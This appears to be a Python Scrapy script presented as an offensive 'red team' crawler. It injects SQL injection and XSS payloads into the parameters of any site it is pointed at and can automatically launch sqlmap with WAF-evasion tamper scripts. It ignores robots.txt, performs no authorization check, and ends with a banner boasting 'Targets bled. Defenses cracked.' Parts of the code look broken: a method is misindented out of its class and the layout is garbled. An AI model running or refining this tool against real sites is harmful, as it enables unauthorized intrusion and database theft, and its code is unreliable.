#!/usr/bin/env python3
# ╔════════════════════════════════════════════════════════════════════════════╗
# ║                                                                            ║                                                # ║                  k A r M a s _ s c r a p y C R w a L e r                  ║
# ║                                                                            ║
# ║     RED TEAM PHANTOM CRAWLER — NO MERCY, NO TRACE, NO REMORSE          ║
# ║     SQLi (error + blind + sqlmap tamper auto) • XSS • CSRF • Headers    ║
# ║                                                                            ║
# ║     Termux 11.8.3 | Android 16 | NYC shadows — January 14, 2026        ║                                                    # ║                                                                            ║                                                # ╚════════════════════════════════════════════════════════════════════════════╝                                                                                                                import argparse                                                 import json                                                     import sqlite3                                                  import sys                                                      import time                                                     import subprocess                                               from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import scrapy                                                   from scrapy.crawler import CrawlerProcess
from scrapy.linkextractors import LinkExtractor                 from scrapy.spiders import CrawlSpider, Rule
from scrapy.utils.log import configure_logging                  
from colorama import Fore, Style, init
                                                                init(autoreset=True)

# ──────────────────────────────────────────────────────────────────────────────                                                # CONFIG & PATHS
# ──────────────────────────────────────────────────────────────────────────────
DB_FILE = "karmas_shadows.db"                                   SQLMAP_PATH = str(Path.home() / "sqlmap" / "sqlmap.py")

# Tamper tiers (best red-team selection 2026)
TAMPER_TIERS = {                                                    1: ["space2comment", "between", "randomcase"],                    # light & fast
    2: ["space2plus", "charencode", "apostrophemask", "base64encode"],# medium evasion                                              3: ["greatest", "ifnull2ifisnull", "space2mysqlblank", "versionedkeywords", "equaltolike"]  # heavy WAF killer
}
                                                                SQLMAP_BASE_ARGS = [                                                "--batch",
    "--level=3",
    "--risk=2",                                                     "--random-agent",                                               "--threads=1",
    "--flush-session",
    "--output-dir", "sqlmap_results"
]                                                                                                                               # ──────────────────────────────────────────────────────────────────────────────
# DATABASE INIT                                                 # ──────────────────────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_FILE)                                 cur = conn.cursor()                                             cur.execute("""
        CREATE TABLE IF NOT EXISTS findings (
            type TEXT, target TEXT, severity TEXT, details TEXT, ts INTEGER                                                             )
    """
    )
    cur.execute("""
        CREATE TABLE IF NOT EXISTS traffic (
                                ts INTEGER, method TEXT, url TEXT, status INTEGER,              req_headers TEXT, resp_headers TEXT, resp_size INTEGER
        )                                                           """
    )
    conn.commit()
    conn.close()
                                                                init_db()                                                        
# ──────────────────────────────────────────────────────────────────────────────                                                # SIGNATURES & PAYLOADS                                         # ──────────────────────────────────────────────────────────────────────────────
SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "sqlstate", "ora-", "microsoft ole db",                                                            "pg_query", "unclosed quotation mark", "error in your sql", "near",
    "quoted string not properly terminated",                    ]                                                                
XSS_PAYLOADS = [
    '\"<script>alert(1)</script>',                                 '\"<img src=x onerror=alert(1)>',                              '\"<svg onload=alert(1)>'
]
                                                                CSRF_TOKEN_NAMES = [                                                'csrf', 'csrf_token', '_csrf', 'csrfmiddlewaretoken', 'authenticity_token',
    '__requestverificationtoken', 'token', 'anti-csrf-token', 'xsrf', 'xsrf-token'                                              ]

BLIND_BOOLEAN_TRUE  = " AND 1=1 -- "
BLIND_BOOLEAN_FALSE = " AND 1=2 -- "                            BLIND_TIME_DELAY    = " AND IF(1=1,SLEEP(5),0) -- "             BLIND_TIME_THRESHOLD = 4.0

# ──────────────────────────────────────────────────────────────────────────────                                                # SKULL ANIMATION
# ──────────────────────────────────────────────────────────────────────────────                                                def animate_skull():                                                frames = [
        r"""
              ☠☠☠                                                           ☠     ☠
          ☠    O    ☠
         ☠   /|\   ☠                                                      ☠  / \  ☠
            ☠☠☠
        """,
        r"""                                                                 ☠☠☠☠
           ☠      ☠
          ☠   ^_^   ☠
         ☠   / | \  ☠                                                     ☠  /   \ ☠
           ☠☠☠☠
        """,
        r"""                                                                ☠☠☠☠☠
          ☠       ☠
         ☠    O_O   ☠
        ☠    / | \   ☠
         ☠   /   \  ☠                                                     ☠☠☠☠☠
        """,                                                            r"""
           ☠☠☠☠☠☠                                                        ☠        ☠
        ☠    >_<    ☠
       ☠    / | \    ☠
        ☠   /   \   ☠
         ☠☠☠☠☠☠
        """,
    ]

    print(Fore.RED + Style.BRIGHT + "\n" + " " * 12 + "PHANTOM AWAKENING...")
    for _ in range(3):
        for frame in frames:                                                sys.stdout.write("\r" + " " * 18 + frame)
            sys.stdout.flush()
            time.sleep(0.18)
        time.sleep(0.4)
    print("\n" + Fore.RED + Style.BRIGHT + " " * 10 + "TARGET ACQUIRED — SHADOWS ENGAGED\n")

# ──────────────────────────────────────────────────────────────────────────────
# CRAWLER — DEATH MACHINE
# ──────────────────────────────────────────────────────────────────────────────
class kArmasCRwaLer(CrawlSpider):
    name = "kArmasCRwaLer"
    custom_settings = {
        "ROBOTSTXT_OBEY": False,
        "USER_AGENT": "kArmas-ZAP-FULL/1.3 (Phantom)",
        "LOG_LEVEL": "INFO",
        "DEPTH_LIMIT": 7,
        "CONCURRENT_REQUESTS": 5,                                       "DOWNLOAD_TIMEOUT": 15,
        "RETRY_ENABLED": True,                                          "RETRY_TIMES": 2,
        "HTTPCACHE_ENABLED": True,
    }                                                            
    rules = (Rule(LinkExtractor(allow=()), callback="parse_item", follow=True),)
                                                                    def __init__(self, *args, allowed_domain=None, headers=None, tamper_tier=1, sqlmap_auto=False, **kwargs):                           super().__init__(*args, **kwargs)
        self.allowed_domain = allowed_domain                            self.headers = headers or {}
        self.visited = set()                                            self.tamper_tier = tamper_tier
        self.sqlmap_auto = sqlmap_auto                          
    def start_requests(self):                                           for url in self.start_urls:
            yield scrapy.Request(url, headers=self.headers, callback=self.parse, meta={"depth": 0})

    def parse(self, response):
        url = response.url                                              if url in self.visited:
            return                                                      self.visited.add(url)

        self.log_traffic(response)

        parsed = urlparse(url)
        params = parse_qs(parsed.query) if parsed.query else {}
        if params:
            self.store_finding("Params", url, "INFO", ",".join(params.keys()))
            yield from self.test_sql_injection(response, params, parsed)
            yield from self.test_xss_injection(response, params, parsed)
            yield from self.test_blind_sqli(response, params, parsed)

        self.check_passive_sqli(response)
        self.check_passive_xss(response, params)
        self.check_csrf_forms(response)

        yield from self.parse_item(response)

    def parse_item(self, response):
        self.log(f"{Fore.CYAN}[CRwaLer]{Style.RESET_ALL} → {response.url} | {response.status}")
        self.check_headers(response)
        self.check_dom_xss(response)
        yield {
            "url": response.url,
            "status": response.status,
            "title": response.css("title::text").get(default="").strip(),
        }

    def log_traffic(self, response):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO traffic VALUES (?,?,?,?,?,?,?)",
            (
                int(time.time()),
                response.request.method,
                response.url,
                response.status,
                json.dumps(dict(response.request.headers)),
                json.dumps(dict(response.headers)),
                len(response.body),
            )
        )
        conn.commit()
        conn.close()

    def store_finding(self, typ, target, sev, det):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO findings VALUES (?,?,?,?,?)",
            (typ, target, sev, det, int(time.time()))
        )
        conn.commit()
        conn.close()
        print(f"{Fore.RED}☠ {sev.upper()} → {typ}: {det} @ {target}{Style.RESET_ALL}")

    # ── PASSIVE CHECKS ──────────────────────────────────────────────────────────

    def check_passive_sqli(self, response):
        text = response.text.lower()
        found = [e for e in SQL_ERRORS if e in text]
        if found:
            self.store_finding("SQLi-Passive", response.url, "MEDIUM", f"Errors: {', '.join(found[:3])}")

    def check_passive_xss(self, response, params):
        text = response.text.lower()
        for p, vals in params.items():
            if vals and any(v.lower() in text for v in vals):
                self.store_finding("XSS-Passive", response.url, "INFO", f"Param '{p}' reflected")

    def check_csrf_forms(self, response):
        for form in response.css("form"):
            method = form.attrib.get("method", "get").lower()
            if method != "post": continue
            inputs = form.css("input")
            has_token = any(
                any(t in name.lower() for t in CSRF_TOKEN_NAMES)
                for name in inputs.xpath("@name").getall()
            )
            if not has_token:
                self.store_finding("CSRF-MissingToken", response.url, "HIGH", "POST form — no CSRF token")

    def check_headers(self, response):
        needed = ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"]
        missing = [h for h in needed if h.lower() not in [k.lower() for k in response.headers.keys()]]
        if missing:
            self.store_finding("Header", response.url, "MEDIUM", f"Missing: {', '.join(missing)}")

    def check_dom_xss(self, response):
        text = response.text.lower()
        if any(s in text for s in ["innerhtml", "document.write", "eval("]):
            self.store_finding("DOM-XSS", response.url, "MEDIUM", "JS sink detected")

    # ── ACTIVE LIGHT PROBES ─────────────────────────────────────────────────────
                                                                    def test_sql_injection(self, orig_response, params, parsed):        for p, vals in params.items():                                      if not vals: continue
            orig = vals[0]                                                  probe = orig + "'"
            q = parse_qs(parsed.query)                                      q[p] = [probe]
            u = parsed._replace(query=urlencode(q, doseq=True)).geturl()                                                                    if u == orig_response.url: continue
            yield scrapy.Request(
                u, headers=self.headers, callback=self.analyze_sqli_probe,
                meta={"orig_url": orig_response.url, "orig_text": orig_response.text, "param": p},
                dont_filter=True
            )
                                                                    def analyze_sqli_probe(self, response):
        m = response.meta                                               if any(e in response.text.lower() for e in SQL_ERRORS) or response.status >= 500:
            self.store_finding("SQLi-Active", m["orig_url"], "HIGH", f"Param '{m['param']}' → error on ' probe")                            if self.sqlmap_auto:
                self.run_sqlmap_on_url_param(m["orig_url"], m["param"])

    def test_xss_injection(self, orig_response, params, parsed):        for p, vals in params.items():
            if not vals: continue                                           orig = vals[0]
            for pay in XSS_PAYLOADS:
                q = parse_qs(parsed.query)
                q[p] = [orig + pay]
                u = parsed._replace(query=urlencode(q, doseq=True)).geturl()
                if u == orig_response.url: continue
                yield scrapy.Request(
                    u, headers=self.headers, callback=self.analyze_xss_probe,
                    meta={"orig_url": orig_response.url, "param": p, "payload": pay},
                    dont_filter=True
                )
                                                                    def analyze_xss_probe(self, response):
        m = response.meta
        payload = m["payload"]
        escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
        if payload in response.text and escaped not in response.text:
            self.store_finding("XSS-Active", m["orig_url"], "HIGH", f"Param '{m["param"]}' → unescaped {payload}")

    def test_blind_sqli(self, orig_response, params, parsed):           for p, vals in params.items():
            if not vals: continue
            orig = vals[0]
            if len(orig) < 1: continue

            # Boolean true
            q = parse_qs(parsed.query)                                      q[p] = [orig + BLIND_BOOLEAN_TRUE]
            u = parsed._replace(query=urlencode(q, doseq=True)).geturl()
            if u != orig_response.url:
                yield scrapy.Request(
                    u, headers=self.headers, callback=self.analyze_blind_boolean,                                                                   meta={
                        "orig_url": orig_response.url,
                        "param": p,
                        "probe_type": "true",                                           "orig_len": len(orig_response.text),                            "orig_status": orig_response.status                         },                                                              dont_filter=True                                            )                                                                                                                           # Boolean false                                                 q = parse_qs(parsed.query)                                      q[p] = [orig + BLIND_BOOLEAN_FALSE]                             u = parsed._replace(query=urlencode(q, doseq=True)).geturl()                                                                    if u != orig_response.url:                                          yield scrapy.Request(
                    u, headers=self.headers, callback=self.analyze_blind_boolean,
                    meta={                                                              "orig_url": orig_response.url,
                        "param": p,                                                     "probe_type": "false",
                        "orig_len": len(orig_response.text),                            "orig_status": orig_response.status                         },
                    dont_filter=True
                )                                                                                                                           # Time-based
            q = parse_qs(parsed.query)
            q[p] = [orig + BLIND_TIME_DELAY]
            u = parsed._replace(query=urlencode(q, doseq=True)).geturl()                                                                    if u != orig_response.url:
                yield scrapy.Request(
                    u, headers=self.headers, callback=self.analyze_blind_time,                                                                      meta={
                        "orig_url": orig_response.url,
                        "param": p,                                                     "start_time": time.time()                                   },
                    dont_filter=True
                )
                                                                    def analyze_blind_boolean(self, response):
        m = response.meta
        diff_len = abs(len(response.text) - m["orig_len"]) > 100
        diff_status = response.status != m["orig_status"]               if diff_len or diff_status:                                         self.store_finding("SQLi-Blind-Boolean", m["orig_url"], "HIGH",                                                                                    f"Param '{m['param']}' → boolean condition difference detected")                                             if self.sqlmap_auto:
                self.run_sqlmap_on_url_param(m["orig_url"], m["param"])                                                         
def analyze_blind_time(self, response):
        elapsed = time.time() - response.meta.get("start_time", time.time())                                                            param = response.meta["param"]
        orig_url = response.meta["orig_url"]                    
        if elapsed > BLIND_TIME_THRESHOLD:
            self.store_finding("SQLi-Blind-Time", orig_url, "HIGH",                                                                                            f"Param '{param}' → delay {elapsed:.2f}s (time-based blind)")
            if self.sqlmap_auto:
                self.run_sqlmap_on_url_param(orig_url, param)
        elif elapsed > BLIND_TIME_THRESHOLD / 2:                            self.store_finding("SQLi-Blind-Time", orig_url, "MEDIUM",
                               f"Param '{param}' → partial delay {elapsed:.2f}s")                                                                                                                   # ── SQLMAP AUTOMATION WITH TAMPER SCRIPTS ───────────────────────────────────
                                                                    def run_sqlmap_on_url_param(self, url, param_name):                 output_folder = Path("sqlmap_results") / f"{urlparse(url).netloc}_{param_name.replace('=', '_')}"
        output_folder.mkdir(parents=True, exist_ok=True)
                                                                        tampers = TAMPER_TIERS.get(self.tamper_tier, TAMPER_TIERS[1])
        tamper_str = ",".join(tampers)
                                                                        cmd = [                                                             "python3", SQLMAP_PATH,
            "-u", url,                                                      "-p", param_name,
            "--tamper", tamper_str,                                         *SQLMAP_BASE_ARGS
        ]                                                                                                                               print(f"{Fore.YELLOW}[SQLMAP AUTO] Tier {self.tamper_tier} → {url} param={param_name}{Style.RESET_ALL}")
        print(f"    Tamper: {tamper_str}")                              print(f"    Output → {output_folder}")                  
        try:                                                                result = subprocess.run(
                cmd,
                capture_output=True,                                            text=True,
                timeout=1800,  # 30 minutes max                                 check=False
            )                                                    
            if result.returncode == 0 and "vulnerable" in result.stdout.lower():
                self.store_finding(
                    "SQLi-Exploitable",                                             url,
                    "CRITICAL",
                    f"sqlmap (tier {self.tamper_tier}) confirmed injection on '{param_name}' → check {output_folder}"
                )                                                           else:
                print(f"{Fore.RED}sqlmap exit code {result.returncode} — no clear vuln{Style.RESET_ALL}")                                                                                               except subprocess.TimeoutExpired:                                   print(f"{Fore.RED}[TIMEOUT] sqlmap killed after 30min on {url}{Style.RESET_ALL}")
        except Exception as e:                                              print(f"{Fore.RED}sqlmap launch error: {e}{Style.RESET_ALL}")                                                        
# ──────────────────────────────────────────────────────────────────────────────
# LAUNCH SEQUENCE                                               # ──────────────────────────────────────────────────────────────────────────────                                                def main():
    animate_skull()                                              
    print(Fore.RED + Style.BRIGHT + r"""
                            ╔════════════════════════════════════════════════════════════╗                                                                  ║                  k A r M a S   C R w a L e r               ║
    ║     RED TEAM PHANTOM — TERMUX SHADOWS 2026                 ║
    ╚════════════════════════════════════════════════════════════╝
    """)                                                        
    parser = argparse.ArgumentParser(description="kArmas_scrapyCRwaLer — Phantom Crawler")
    parser.add_argument("target", help="Starting URL (https://...)")                                                                parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--auth", help="Auth header e.g. 'Authorization: Bearer xyz'")                                              parser.add_argument("--sqlmap-auto", action="store_true", help="Auto-run sqlmap on HIGH findings")                              parser.add_argument("--tamper-tier", type=int, choices=[1,2,3], default=1,                                                                          help="Tamper tier: 1=light, 2=medium, 3=heavy (default: 1)")
    args = parser.parse_args()                                  
    target = args.target.rstrip("/")                                domain = urlparse(target).netloc
                                                                    headers = {"User-Agent": "kArmas-ZAP-FULL/1.3"}
    if args.cookie:                                                     headers["Cookie"] = args.cookie                             if args.auth and ":" in args.auth:
        k, v = args.auth.split(":", 1)
        headers[k.strip()] = v.strip()                          
    configure_logging({"LOG_FORMAT": "[%(levelname)s] %(message)s"})                                                              
    process = CrawlerProcess(settings={                                 "FEEDS": {"results.json": {"format": "json"}},
    })                                                                                                                              process.crawl(
        kArmasCRwaLer,                                                  start_urls=[target],
        allowed_domains=[domain],                                       headers=headers,                                                tamper_tier=args.tamper_tier,                                   sqlmap_auto=args.sqlmap_auto                                )                                                                                                                               process.start()                                                                                                                 print(Fore.RED + Style.BRIGHT + r"""
                            ╔════════════════════════════════════════════════════════════╗                                                                  ║          MISSION COMPLETE — SHADOWS RETREAT                ║                                                                  ║                                                            ║                                                                  ║                     ☠☠☠   DEATH LOG   ☠☠☠                 ║                                                                   ║         karmas_shadows.db  •  results.json                 ║                                                                  ║         sqlmap_results/ → tamper exploitation logs         ║                                                                  ║                                                            ║                                                                  ║     Targets bled. Defenses cracked. Night remains ours.   ║                                                                   ╚════════════════════════════════════════════════════════════╝                                                                  """)                                                                                                                        if __name__ == "__main__":                                          main()